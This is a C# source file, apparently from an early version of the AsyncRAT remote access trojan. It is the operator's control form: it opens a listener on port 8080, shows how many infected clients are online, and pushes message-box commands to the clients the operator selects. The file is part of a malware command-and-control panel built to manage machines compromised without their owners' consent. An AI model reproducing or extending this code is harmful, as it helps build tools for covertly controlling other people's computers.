using System;
using System.Windows.Forms;
using AsyncRAT_Sharp.MessagePack;
using AsyncRAT_Sharp.Sockets;
using System.Threading.Tasks;
using Microsoft.VisualBasic;

namespace AsyncRAT_Sharp
{
    public partial class Form1 : Form
    {
        public Form1()
        {
            InitializeComponent();
        }

       async private void Form1_Load(object sender, EventArgs e)
        {
            Listener listener = new Listener();
            listener.Connect(8080);

            while (true)
            {
                await Task.Delay(1000);
                toolStripStatusLabel1.Text = string.Format("Online {0}", listView1.Items.Count.ToString());
            }
        }

        private void sendMessageToolStripMenuItem_Click(object sender, EventArgs e)
        {
            string URL = Interaction.InputBox("Message", "Message", "Hello World!");
            if (string.IsNullOrEmpty(URL))
                return;
            else
            {
                MsgPack msgpack = new MsgPack();
                msgpack.ForcePathObject("Packet").AsString = "MessageBox";
                msgpack.ForcePathObject("Message").AsString = URL;
                foreach (ListViewItem C in listView1.SelectedItems)
                {
                    Clients CL = (Clients)C.Tag;
                    CL.BeginSend(msgpack.Encode2Bytes());
                }
            }
        }

        private void listView1_Resize(object sender, EventArgs e)
        {
           listView1.AutoResizeColumns(ColumnHeaderAutoResizeStyle.HeaderSize);
        }
    }
}